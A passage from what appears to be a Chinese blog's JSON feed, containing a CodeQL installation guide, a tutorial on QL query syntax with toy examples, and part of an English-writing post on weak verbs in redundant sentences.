            "content_html": "<p>CodeQL 是一个代码语义分析引擎，可以用来发现代码中存在的漏洞。CodeQL 首先对项目进行静态分析，生成一系列中间文件，称为 database。用户可以编写 QL 查询语句，利用 CodeQL 引擎对这些数据库进行查询。</p>\n<h1 id=\"1-安装\"><a class=\"markdownIt-Anchor\" href=\"#1-安装\">#</a> 1. 安装</h1>\n<ul>\n<li>\n<p>Visual Studio Code</p>\n<p>因为 CodeQL 一般搭配 VS Code 使用，所以我们先下载 VS Code。官网地址： <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb2RlLnZpc3VhbHN0dWRpby5jb20vRG93bmxvYWQ=\">https://code.visualstudio.com/Download</span></p>\n</li>\n<li>\n<p>CodeQL</p>\n<ul>\n<li>\n<p>命令行工具下载</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2dpdGh1Yi9jb2RlcWwtY2xpLWJpbmFyaWVzL3JlbGVhc2Vz\">https://github.com/github/codeql-cli-binaries/releases</span></p>\n<p><img data-src=\"codeql.assets/image-20221011072919774.png\" alt=\"image-20221011072919774\"></p>\n<p>选择自己的操作系统对应的版本，下载解压好之后再添加系统变量\t\t<img data-src=\"codeql.assets/image-20221011073232229.png\" alt=\"image-20221011073232229\" style=\"zoom:30%;\" /></p>\n<p>mac 添加环境变量的方法</p>\n<p>a.  <code>vi ~/.bash_profile</code></p>\n<p>b. 末尾添加一行  <code>export PATH=your-path/codeql-cli:$PATH</code></p>\n<p>c. 退出， <code>source ~/.bash_profile</code></p>\n</li>\n<li>\n<p>VS Code 插件下载</p>\n<p><img data-src=\"codeql.assets/image-20221011074329619.png\" alt=\"image-20221011074329619\"></p>\n</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"2-生成database\"><a class=\"markdownIt-Anchor\" href=\"#2-生成database\">#</a> 2. 生成 database</h1>\n<h1 id=\"3-查询\"><a class=\"markdownIt-Anchor\" href=\"#3-查询\">#</a> 3. 查询</h1>\n",
            "tags": [
                "codeql"
            ]
        },
        {
            "id": "https://snowroll.github.io/CodeQL-synatx/",
            "url": "https://snowroll.github.io/CodeQL-synatx/",
            "title": "CodeQL 语法",
            "date_published": "2022-10-08T12:00:00.000Z",
            "content_html": "<h2 id=\"codeql\"><a class=\"markdownIt-Anchor\" href=\"#codeql\">#</a> CodeQL</h2>\n<p>官方文档   <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb2RlcWwuZ2l0aHViLmNvbS9kb2NzL3FsLWxhbmd1YWdlLXJlZmVyZW5jZS8=\">https://codeql.github.com/docs/ql-language-reference/</span></p>\n<h3 id=\"1-ql语言特性\"><a class=\"markdownIt-Anchor\" href=\"#1-ql语言特性\">#</a> 1. QL 语言特性</h3>\n<p>逻辑语言，继承自 Datalog。例如，针对一个包含父子关系数据库，查询一个人的所有后代总数。逻辑表达</p>\n<ol>\n<li>找到这个人的后代，孩子或者孩子的后代</li>\n<li>计算总数</li>\n</ol>\n<p>QL 查询语句如下</p>\n<figure class=\"highlight q\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Person getADescendant(Person p) &#123;</span><br><span class=\"line\">  result = p.getAChild() <span class=\"built_in\">or</span></span><br><span class=\"line\">  result = getADescendant(p.getAChild())</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> getNumberOfDescendants(Person p) &#123;</span><br><span class=\"line\">  result = <span class=\"built_in\">count</span>(getADescendant(p))</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"2-predicates-谓词\"><a class=\"markdownIt-Anchor\" href=\"#2-predicates-谓词\">#</a> 2. Predicates 谓词</h3>\n<p>谓词用来描述逻辑关系，一个谓词测试一组元组。</p>\n<figure class=\"highlight q\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">predicate isCountry(<span class=\"built_in\">string</span> country) &#123;</span><br><span class=\"line\">  country = <span class=\"string\">&quot;Germany&quot;</span></span><br><span class=\"line\">  <span class=\"built_in\">or</span></span><br><span class=\"line\">  country = <span class=\"string\">&quot;Belgium&quot;</span></span><br><span class=\"line\">  <span class=\"built_in\">or</span></span><br><span class=\"line\">  country = <span class=\"string\">&quot;France&quot;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">predicate hasCapital(<span class=\"built_in\">string</span> country, <span class=\"built_in\">string</span> capital) &#123;</span><br><span class=\"line\">  country = <span class=\"string\">&quot;Belgium&quot;</span> <span class=\"built_in\">and</span> capital = <span class=\"string\">&quot;Brussels&quot;</span></span><br><span class=\"line\">  <span class=\"built_in\">or</span></span><br><span class=\"line\">  country = <span class=\"string\">&quot;Germany&quot;</span> <span class=\"built_in\">and</span> capital = <span class=\"string\">&quot;Berlin&quot;</span></span><br><span class=\"line\">  <span class=\"built_in\">or</span></span><br><span class=\"line\">  country = <span class=\"string\">&quot;France&quot;</span> <span class=\"built_in\">and</span> capital = <span class=\"string\">&quot;Paris&quot;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>谓词 <code>isCountry</code>  是一元元组 <code>&#123;(&quot;Belgium&quot;),(&quot;Germany&quot;),(&quot;France&quot;)&#125;</code></p>\n<h4 id=\"谓词定义规则\"><a class=\"markdownIt-Anchor\" href=\"#谓词定义规则\">#</a> 谓词定义规则：</h4>\n<ol>\n<li><code>predicate</code>  - 没有返回结果 / 返回值类型 - 有返回结果</li>\n<li>名字，以小写字母开头</li>\n<li>参数，类型 + 名字，如果有多个参数，以逗号分隔</li>\n<li>主体</li>\n</ol>\n<ul>\n<li>\n<p><strong>没有返回结果</strong></p>\n<figure class=\"highlight q\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">predicate isSmall(<span class=\"type\">int</span> i) &#123;</span><br><span class=\"line\">  i in [<span class=\"number\">1</span> .. <span class=\"number\">9</span>]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p><strong>有返回结果</strong></p>\n<figure class=\"highlight q\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> getSuccessor(<span class=\"type\">int</span> i) &#123;</span><br><span class=\"line\">  result = i + <span class=\"number\">1</span> <span class=\"built_in\">and</span></span><br><span class=\"line\">  i in [<span class=\"number\">1</span> .. <span class=\"number\">9</span>]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h4 id=\"谓词类型\"><a class=\"markdownIt-Anchor\" href=\"#谓词类型\">#</a> 谓词类型</h4>\n<ol>\n<li>非成员谓词  class 之外定义</li>\n<li>特征谓词  class 内定义，且所有变量都被 <code>this</code>  限制</li>\n<li>成员谓词  class 内定义</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int getSuccessor(int i) &#123;  &#x2F;&#x2F; 1. Non-member predicate</span><br><span class=\"line\">  result &#x3D; i + 1 and</span><br><span class=\"line\">  i in [1 .. 9]</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">class FavoriteNumbers extends int &#123;</span><br><span class=\"line\">  FavoriteNumbers() &#123;  &#x2F;&#x2F; 2. Characteristic predicate</span><br><span class=\"line\">    this &#x3D; 1 or</span><br><span class=\"line\">    this &#x3D; 4 or</span><br><span class=\"line\">    this &#x3D; 9</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  string getName() &#123;   &#x2F;&#x2F; 3. Member predicate for the class &#96;FavoriteNumbers&#96;</span><br><span class=\"line\">    this &#x3D; 1 and result &#x3D; &quot;one&quot;</span><br><span class=\"line\">    or</span><br><span class=\"line\">    this &#x3D; 4 and result &#x3D; &quot;four&quot;</span><br><span class=\"line\">    or</span><br><span class=\"line\">    this &#x3D; 9 and result &#x3D; &quot;nine&quot;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"谓词绑定\"><a class=\"markdownIt-Anchor\" href=\"#谓词绑定\">#</a> 谓词绑定</h4>\n<p>谓词必须能在有限时间内验证，所以其对应的集合不能是无限的，否则会报错</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;*</span><br><span class=\"line\">  Compilation errors:</span><br><span class=\"line\">  ERROR: &quot;i&quot; is not bound to a value.</span><br><span class=\"line\">  ERROR: &quot;result&quot; is not bound to a value.</span><br><span class=\"line\">  ERROR: expression &quot;i * 4&quot; is not bound to a value.</span><br><span class=\"line\">*&#x2F;</span><br><span class=\"line\">int multiplyBy4(int i) &#123;</span><br><span class=\"line\">  result &#x3D; i * 4</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>绑定集合</strong></p>\n<p>如果想创建 “无限谓词”，然后在有限集合上使用。必须添加注解 <code>bindingset</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bindingset[i]</span><br><span class=\"line\">int multiplyBy4(int i) &#123;</span><br><span class=\"line\">  result &#x3D; i * 4</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">from int i  &#x2F;&#x2F; 数据集</span><br><span class=\"line\">where i in [1 .. 10]  &#x2F;&#x2F; 限制条件</span><br><span class=\"line\">select multiplyBy4(i)  &#x2F;&#x2F; 运算得到结果</span><br></pre></td></tr></table></figure>\n<h4 id=\"数据集谓词\"><a class=\"markdownIt-Anchor\" href=\"#数据集谓词\">#</a> 数据集谓词</h4>\n<p>每个数据集都包含着一个记录值关系的表格，“database predicates”。其被认为是另一种 QL 中的谓词</p>\n<h3 id=\"3-queries-查询\"><a class=\"markdownIt-Anchor\" href=\"#3-queries-查询\">#</a> 3. Queries 查询</h3>\n<p>Queries 是 QL 程序的输出，对结果进行评估</p>\n<p>两类 Queries</p>\n<ul>\n<li><code>select clause</code>  选择子句，在 module 中定义</li>\n<li><code>query predicates</code>  查询谓词，在 module 的谓词作用域，可以由模块自己定义，也可以从其他模块进行导入</li>\n</ul>\n<h4 id=\"select-clauses\"><a class=\"markdownIt-Anchor\" href=\"#select-clauses\">#</a> Select clauses</h4>\n<p>写一个查询模块（一般是 <code>.ql</code>  文件）时，可以包含一个选择子句，一般在文件末尾</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from &#x2F;* ... variable declarations ... *&#x2F;</span><br><span class=\"line\">where &#x2F;* ... logical formula ... *&#x2F;</span><br><span class=\"line\">select &#x2F;* ... expressions ... *&#x2F;</span><br></pre></td></tr></table></figure>\n<p><code>from</code>  和 <code>where</code>  是可选项</p>\n<p><code>expressions</code>  的两个关键词</p>\n<ul>\n<li><code>as</code> ，紧跟一个名字，设置结果栏的标签</li>\n<li><code>order by</code> ，紧跟结果栏的名字，可以按顺序排列结果 两个顺序关键词， <code>asc</code>  /  <code>desc</code></li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from int x, int y</span><br><span class=\"line\">where x &#x3D; 3 and y in [0 .. 2]</span><br><span class=\"line\">select x, y, x * y as product, &quot;product: &quot; + product</span><br></pre></td></tr></table></figure>\n<p>结果</p>\n<table>\n<thead>\n<tr>\n<th>x</th>\n<th>y</th>\n<th>product</th>\n<th>[3]</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>3</td>\n<td>0</td>\n<td>0</td>\n<td>0</td>\n</tr>\n<tr>\n<td>3</td>\n<td>1</td>\n<td>3</td>\n<td>3</td>\n</tr>\n<tr>\n<td>3</td>\n<td>2</td>\n<td>6</td>\n<td>6</td>\n</tr>\n</tbody>\n</table>\n<p>可以在选择子句的最后添加 <code>order by y desc</code> ，结果会按照 y 的降序排列</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from int x, int y</span><br><span class=\"line\">where x &#x3D; 3 and y in [0 .. 2]</span><br><span class=\"line\">select x, y, x * y as product, &quot;product: &quot; + product order by y desc</span><br></pre></td></tr></table></figure>\n<p>结果</p>\n<table>\n<thead>\n<tr>\n<th>x</th>\n<th>y</th>\n<th>product</th>\n<th>[3]</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>3</td>\n<td>2</td>\n<td>6</td>\n<td>6</td>\n</tr>\n<tr>\n<td>3</td>\n<td>1</td>\n<td>3</td>\n<td>3</td>\n</tr>\n<tr>\n<td>3</td>\n<td>0</td>\n<td>0</td>\n<td>0</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"query-predicates\"><a class=\"markdownIt-Anchor\" href=\"#query-predicates\">#</a> Query predicates</h4>\n<p>查询谓词就是带有 <code>query</code>  注解的非成员谓词，会返回所有谓词评估通过的元组</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">query int getProduct(int x, int y) &#123;</span><br><span class=\"line\">  x &#x3D; 3 and</span><br><span class=\"line\">  y in [0 .. 2] and</span><br><span class=\"line\">  result &#x3D; x * y</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>结果</p>\n<table>\n<thead>\n<tr>\n<th>x</th>\n<th>y</th>\n<th>result</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>3</td>\n<td>0</td>\n<td>0</td>\n</tr>\n<tr>\n<td>3</td>\n<td>1</td>\n<td>3</td>\n</tr>\n<tr>\n<td>3</td>\n<td>2</td>\n<td>6</td>\n</tr>\n</tbody>\n</table>\n<p>查询谓词的好处是可以在代码的其他部分调用，而选择子句不行。例如，你可以在类中使用 <code>getProduct</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class MultipleOfThree extends int &#123;</span><br><span class=\"line\">  MultipleOfThree() &#123; this &#x3D; getProduct(_, _) &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "codeql"
            ]
        },
        {
            "id": "https://snowroll.github.io/Line-By-Line-1/",
            "url": "https://snowroll.github.io/Line-By-Line-1/",
            "title": "Line By Line-1 松散冗余的句子",
            "date_published": "2022-09-24T09:06:25.000Z",
            "content_html": "<h3 id=\"冗余句子特征\"><a class=\"markdownIt-Anchor\" href=\"#冗余句子特征\">#</a> 冗余句子特征</h3>\n<h4 id=\"1-弱动词weak-verbs\"><a class=\"markdownIt-Anchor\" href=\"#1-弱动词weak-verbs\">#</a> 1. 弱动词（weak verbs）</h4>\n<p><strong>to be</strong>（am， are， is，was…），<strong>含糊不清的无动作动词</strong>（like /exist），<strong>被动形式 to be</strong>（is believed）</p>\n<p>例:<br>\nMore remote, less densely populated suburbs, <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mstyle mathcolor=\"red\"><mrow><mi>w</mi><mi>h</mi><mi>o</mi><mi>s</mi><mi>e</mi></mrow></mstyle></mrow><annotation encoding=\"application/x-tex\">\\color{red}{whose}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord\" style=\"color:red;\"><span class=\"mord mathnormal\" style=\"margin-right:0.02691em;color:red;\">w</span><span class=\"mord mathnormal\" style=\"color:red;\">h</span><span class=\"mord mathnormal\" style=\"color:red;\">o</span><span class=\"mord mathnormal\" style=\"color:red;\">s</span><span class=\"mord mathnormal\" style=\"color:red;\">e</span></span></span></span></span> lower values <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mstyle mathcolor=\"red\"><mrow><mi>w</mi><mi>e</mi><mi>r</mi><mi>e</mi><mtext>  </mtext><mi>o</mi><mi>f</mi><mi>t</mi><mi>e</mi><mi>n</mi><mtext>  </mtext><mi>a</mi><mtext>  </mtext><mi>f</mi><mi>u</mi><mi>n</mi><mi>c</mi><mi>t</mi><mi>i</mi><mi>o</mi><mi>n</mi></mrow></mstyle></mrow><annotation encoding=\"application/x-tex\">\\color{red}{were \\; often \\; a \\; function}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord\" style=\"color:red;\"><span class=\"mord mathnormal\" style=\"margin-right:0.02691em;color:red;\">w</span><span class=\"mord mathnormal\" style=\"color:red;\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;color:red;\">r</span><span class=\"mord mathnormal\" style=\"color:red;\">e</span><span class=\"mspace\" style=\"color:red;margin-right:0.2777777777777778em;\"></span><span class=\"mord mathnormal\" style=\"color:red;\">o</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;color:red;\">f</span><span class=\"mord mathnormal\" style=\"color:red;\">t</span><span class=\"mord mathnormal\" style=\"color:red;\">e</span><span class=\"mord mathnormal\" style=\"color:red;\">n</span><span class=\"mspace\" style=\"color:red;margin-right:0.2777777777777778em;\"></span><span class=\"mord mathnormal\" style=\"color:red;\">a</span><span class=\"mspace\" style=\"color:red;margin-right:0.2777777777777778em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;color:red;\">f</span><span class=\"mord mathnormal\" style=\"color:red;\">u</span><span class=\"mord mathnormal\" style=\"color:red;\">n</span><span class=\"mord mathnormal\" style=\"color:red;\">c</span><span class=\"mord mathnormal\" style=\"color:red;\">t</span><span class=\"mord mathnormal\" style=\"color:red;\">i</span><span class=\"mord mathnormal\" style=\"color:red;\">o</span><span class=\"mord mathnormal\" style=\"color:red;\">n</span></span></span></span></span> of how far they <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mstyle mathcolor=\"red\"><mrow><mi>w</mi><mi>e</mi><mi>r</mi><mi>e</mi></mrow></mstyle></mrow><annotation encoding=\"application/x-tex\">\\color{red}{were}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord\" style=\"color:red;\"><span class=\"mord mathnormal\" style=\"margin-right:0.02691em;color:red;\">w</span><span class=\"mord mathnormal\" style=\"color:red;\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;color:red;\">r</span><span class=\"mord mathnormal\" style=\"color:red;\">e</span></span></span></span></span> from work centers,  and small towns in rural locations, <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mstyle mathcolor=\"red\"><mrow><mi>w</mi><mi>h</mi><mi>o</mi><mi>s</mi><mi>e</mi></mrow></mstyle></mrow><annotation encoding=\"application/x-tex\">\\color{red}{whose}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord\" style=\"color:red;\"><span class=\"mord mathnormal\" style=\"margin-right:0.02691em;color:red;\">w</span><span class=\"mord mathnormal\" style=\"color:red;\">h</span><span class=\"mord mathnormal\" style=\"color:red;\">o</span><span class=\"mord mathnormal\" style=\"color:red;\">s</span><span class=\"mord mathnormal\" style=\"color:red;\">e</span></span></span></span></span> lower values <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mstyle mathcolor=\"red\"><mrow><mi>w</mi><mi>e</mi><mi>r</mi><mi>e</mi><mtext>  </mtext><mi>a</mi><mtext>  </mtext><mi>r</mi><mi>e</mi><mi>f</mi><mi>l</mi><mi>e</mi><mi>c</mi><mi>t</mi><mi>i</mi><mi>o</mi><mi>n</mi></mrow></mstyle></mrow><annotation encoding=\"application/x-tex\">\\color{red}{were \\; a \\; reflection}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord\" style=\"color:red;\"><span class=\"mord mathnormal\" style=\"margin-right:0.02691em;color:red;\">w</span><span class=\"mord mathnormal\" style=\"color:red;\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;color:red;\">r</span><span class=\"mord mathnormal\" style=\"color:red;\">e</span><span class=\"mspace\" style=\"color:red;margin-right:0.2777777777777778em;\"></span><span class=\"mord mathnormal\" style=\"color:red;\">a</span><span class=\"mspace\" style=\"color:red;margin-right:0.2777777777777778em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;color:red;\">r</span><span class=\"mord mathnormal\" style=\"color:red;\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;color:red;\">f</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;color:red;\">l</span><span class=\"mord mathnormal\" style=\"color:red;\">e</span><span class=\"mord mathnormal\" style=\"color:red;\">c</span><span class=\"mord mathnormal\" style=\"color:red;\">t</span><span class=\"mord mathnormal\" style=\"color:red;\">i</span><span class=\"mord mathnormal\" style=\"color:red;\">o</span><span class=\"mord mathnormal\" style=\"color:red;\">n</span></span></span></span></span> of the <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mstyle mathcolor=\"red\"><mrow><mi>d</mi><mi>i</mi><mi>f</mi><mi>f</mi><mi>i</mi><mi>c</mi><mi>u</mi><mi>l</mi><mi>t</mi><mi>y</mi><mtext>  </mtext><mi>o</mi><mi>f</mi><mtext>  </mtext><mi>e</mi><mi>a</mi><mi>r</mi><mi>n</mi><mi>i</mi><mi>n</mi><mi>g</mi></mrow></mstyle></mrow><annotation encoding=\"application/x-tex\">\\color{red}{difficulty \\; of \\; earning}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord\" style=\"color:red;\"><span class=\"mord mathnormal\" style=\"color:red;\">d</span><span class=\"mord mathnormal\" style=\"color:red;\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;color:red;\">f</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;color:red;\">f</span><span class=\"mord mathnormal\" style=\"color:red;\">i</span><span class=\"mord mathnormal\" style=\"color:red;\">c</span><span class=\"mord mathnormal\" style=\"color:red;\">u</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;color:red;\">l</span><span class=\"mord mathnormal\" style=\"color:red;\">t</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;color:red;\">y</span><span class=\"mspace\" style=\"color:red;margin-right:0.2777777777777778em;\"></span><span class=\"mord mathnormal\" style=\"color:red;\">o</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;color:red;\">f</span><span class=\"mspace\" style=\"color:red;margin-right:0.2777777777777778em;\"></span><span class=\"mord mathnormal\" style=\"color:red;\">e</span><span class=\"mord mathnormal\" style=\"color:red;\">a</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;color:red;\">r</span><span class=\"mord mathnormal\" style=\"color:red;\">n</span><span class=\"mord mathnormal\" style=\"color:red;\">i</span><span class=\"mord mathnormal\" style=\"color:red;\">n</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;color:red;\">g</span></span></span></span></span> a living, <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mstyle mathcolor=\"red\"><mrow><mi>a</mi><mi>r</mi><mi>e</mi></mrow></mstyle></mrow><annotation encoding=\"application/x-tex\">\\color{red}{are}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord\" style=\"color:red;\"><span class=\"mord mathnormal\" style=\"color:red;\">a</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;color:red;\">r</span><span class=\"mord mathnormal\" style=\"color:red;\">e</span></span></span></span></span> likely to see considerable <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mstyle mathcolor=\"red\"><mrow><mi>a</mi><mi>p</mi><mi>p</mi><mi>r</mi><mi>e</mi><mi>c</mi><mi>i</mi><mi>a</mi><mi>t</mi><mi>i</mi><mi>o</mi><mi>n</mi><mtext>  </mtext><mi>o</mi><mi>f</mi></mrow></mstyle></mrow><annotation encoding=\"application/x-tex\">\\color{red}{appreciation \\; of}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord\" style=\"color:red;\"><span class=\"mord mathnormal\" style=\"color:red;\">a</span><span class=\"mord mathnormal\" style=\"color:red;\">p</span><span class=\"mord mathnormal\" style=\"color:red;\">p</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;color:red;\">r</span><span class=\"mord mathnormal\" style=\"color:red;\">e</span><span class=\"mord mathnormal\" style=\"color:red;\">c</span><span class=\"mord mathnormal\" style=\"color:red;\">i</span><span class=\"mord mathnormal\" style=\"color:red;\">a</span><span class=\"mord mathnormal\" style=\"color:red;\">t</span><span class=\"mord mathnormal\" style=\"color:red;\">i</span><span class=\"mord mathnormal\" style=\"color:red;\">o</span><span class=\"mord mathnormal\" style=\"color:red;\">n</span><span class=\"mspace\" style=\"color:red;margin-right:0.2777777777777778em;\"></span><span class=\"mord mathnormal\" style=\"color:red;\">o</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;color:red;\">f</span></span></span></span></span> their property values in the next two decades.<br>\n 修改后：<br>\nSince many people will no longer have to commute to work centers to earn a living, property values in the more distant suburbs and rural areas should appreciate considerably in the next two decades.</p>\n<p>解析：<br>\n原句主体： 未来 20 年，边远地区房价会上涨。原因，人们不再需要通过通勤上班。</p>\n<p>修改方法：</p>\n<ul>\n<li>\n<p>动词被动 -&gt; 主动   be done -&gt; do</p>\n</li>\n<li>\n<p>减少不必要的从句，避免多余的动词</p>\n</li>\n<li>\n<p>避免冗长的句式，there is / It’s important to note that</p>\n</li>\n<li>\n<p>并非摈弃所有被动句式</p>\n</li>\n</ul>\n<h4 id=\"2-晦涩的名词ponderous-noun\"><a class=\"markdownIt-Anchor\" href=\"#2-晦涩的名词ponderous-noun\">#</a> 2. 晦涩的名词（ponderous noun）</h4>\n<p>笨重的名词，特别是后缀为 tion、ment 和 ence 的名词</p>\n<p>例：The <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mstyle mathcolor=\"red\"><mrow><mi>s</mi><mi>t</mi><mi>a</mi><mi>b</mi><mi>i</mi><mi>l</mi><mi>i</mi><mi>t</mi><mi>y</mi><mtext>  </mtext><mi>a</mi><mi>n</mi><mi>d</mi><mtext>  